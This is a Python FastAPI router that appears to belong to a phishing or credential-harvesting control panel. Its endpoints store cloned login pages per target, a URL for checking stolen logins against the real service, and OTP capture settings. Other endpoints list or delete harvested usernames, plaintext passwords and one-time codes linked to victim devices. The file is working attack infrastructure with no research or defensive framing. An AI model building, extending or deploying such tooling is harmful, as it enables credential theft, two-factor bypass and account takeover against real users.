from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, desc
from backend.database import get_db
from backend.auth import get_current_user, require_role
from backend.models import HarvestConfig, Credential, Device
from backend.api.dashboard.cloner_router import _ssrf_check

router = APIRouter(prefix="/harvest", tags=["harvest"])


@router.get("/configs")
async def list_configs(db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(HarvestConfig))
    configs = result.scalars().all()
    return [{"id": c.id, "target_name": c.target_name, "otp_enabled": c.otp_enabled,
             "validation_url": c.validation_url} for c in configs]


@router.post("/configs")
async def create_config(body: dict, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    validation_url = body.get("validation_url")
    if validation_url:
        _ssrf_check(validation_url)
    cfg = HarvestConfig(
        target_name=body.get("target_name", "New Target"),
        login_html=body.get("login_html", ""),
        validation_url=validation_url,
        validation_method=body.get("validation_method", "POST"),
        otp_enabled=body.get("otp_enabled", False),
        otp_timeout=body.get("otp_timeout", 120),
    )
    db.add(cfg)
    await db.commit()
    await db.refresh(cfg)
    return {"id": cfg.id, "target_name": cfg.target_name}


@router.get("/configs/{config_id}")
async def get_config(config_id: int, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(HarvestConfig).where(HarvestConfig.id == config_id))
    cfg = result.scalar_one_or_none()
    if not cfg:
        raise HTTPException(404, "not_found")
    return {"id": cfg.id, "target_name": cfg.target_name, "login_html": cfg.login_html,
            "validation_url": cfg.validation_url, "validation_method": cfg.validation_method,
            "otp_enabled": cfg.otp_enabled, "otp_timeout": cfg.otp_timeout}


@router.put("/configs/{config_id}")
async def update_config(config_id: int, body: dict, db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(select(HarvestConfig).where(HarvestConfig.id == config_id))
    cfg = result.scalar_one_or_none()
    if not cfg:
        raise HTTPException(404, "not_found")
    for field in ("target_name", "login_html", "validation_url", "validation_method", "otp_enabled", "otp_timeout"):
        if field in body:
            setattr(cfg, field, body[field])
    await db.commit()
    return {"ok": True}


@router.delete("/credentials/{credential_id}")
async def delete_credential(credential_id: int, db: AsyncSession = Depends(get_db), user=Depends(require_role("admin", "operator"))):
    result = await db.execute(select(Credential).where(Credential.id == credential_id))
    cred = result.scalar_one_or_none()
    if not cred:
        raise HTTPException(404, "not_found")
    await db.delete(cred)
    await db.commit()
    return {"ok": True}

@router.get("/credentials")
async def all_credentials(db: AsyncSession = Depends(get_db), user=Depends(get_current_user)):
    result = await db.execute(
        select(Credential, Device.name.label("device_name"))
        .join(Device, Credential.device_id == Device.id, isouter=True)
        .order_by(desc(Credential.timestamp))
        .limit(200)
    )
    rows = result.all()
    return [{
        "id": r.Credential.id, "device_id": r.Credential.device_id,
        "device_name": r.device_name,
        "type": r.Credential.type,
        "username": r.Credential.username, "password": r.Credential.password,
        "otp": r.Credential.otp, "validated": r.Credential.validated,
        "timestamp": r.Credential.timestamp.isoformat() if r.Credential.timestamp else None,
    } for r in rows]
